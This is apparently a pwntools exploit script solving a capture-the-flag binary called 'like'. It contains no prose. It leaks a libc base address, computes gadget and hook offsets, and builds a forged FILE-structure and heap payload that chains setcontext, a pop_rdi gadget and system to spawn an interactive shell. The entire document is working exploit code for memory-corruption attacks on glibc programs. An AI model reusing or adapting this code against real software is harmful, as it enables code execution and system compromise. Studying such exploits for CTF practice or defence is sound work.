from pwn import *

p = process('./like', env={"LD_PRELOAD":"./libc.so.6"})

def start(namesize, name, description):
   p.sendlineafter("size : ", str(namesize))
   p.sendafter("Name : ", name)
   p.sendafter("Description : ", description)

p.sendlineafter("size : ", str(0x6c28c0+0x28))
start(0x300000, 'a'*0x68, 'a'*0x68)

p.recvuntil("tion : " + "a"*0x68)

one = [0x45526, 0x4557a, 0xf1651, 0xf24cb]
leak = u64(p.recv(6).ljust(8,'\x00'))
libc_base = leak - 0x3c2520
malloc_hook = libc_base + 0x3c1af0
_IO_buf_end = libc_base + 0x3c1900 + 0x500
one_gadget = libc_base + one[2]
_dl_open_hook = libc_base + 0x3c62e0
io_wide_data = libc_base + 0x3c19a0
print "libc_base : " + hex(libc_base)
print "one_gadget : " + hex(one_gadget)
print "_IO_buf_end : " + hex(_IO_buf_end)
print "_dl_open_hook : " + hex(_dl_open_hook)
print "malloc_hook : " + hex(malloc_hook)

io_vtable = libc_base + 0x3be400
main_arena_88 = malloc_hook + 0x10 + 88
setcontext = libc_base + 0x48010
pop_rdi = libc_base + 0x1fd7a
system = libc_base + 0x456a0

p.sendafter(" : ", "\x10\x99")

pay = ''
pay += p64(_IO_buf_end)[2:]
pay += p64(0)*6
pay += p64(0xffffffffffffffff)
pay += p64(0x000000000a000000)
pay += p64(libc_base + 0x3c3770)
pay += p64(0xffffffffffffffff)
pay += p64(0)
pay += p64(libc_base + 0x3c19a0)
pay += p64(0)*3
pay += p32(0xffffffff) + p32(0)
pay += p64(0)*2
pay += p64(io_vtable)

pay2 = p64(0) + p64(0x91)
pay2 += p64(0) + p64(_dl_open_hook - 0x10)
pay2 += p64(0)*2*7
pay2 += p64(0) + p64(0x21)
pay2 += p64(0)*2*1
pay2 += p64(0) + p64(0x21)
pay2 += '\x00'*(0x10*19 - len(pay2))


pay += pay2

pay += p64(libc_base + 0x3bdec0) + p64(0)
pay += p64(libc_base + 0x88680) + p64(libc_base + 0x88260)
pay += p64(0)*2
pay += p32(0)+p32(0)
pay += p64(0)*2*5
# pay += 'aaaaaaaa'
pay += p64(libc_base + 0x937)
pay += p64(setcontext+53)
pay += p64(io_wide_data)*2
pay += p64(0)*2*8
pay += p64(libc_base + 3939336)   # 0xa0
pay += p64(pop_rdi)
pay += p64(libc_base + 0x18ac40)
pay += p64(system)
p.sendafter(" : ", "1 " + pay)
raw_input()

# pause()
raw_input()
p.sendafter(" : ", "1 " + p64(_IO_buf_end)[2:])


p.interactive()
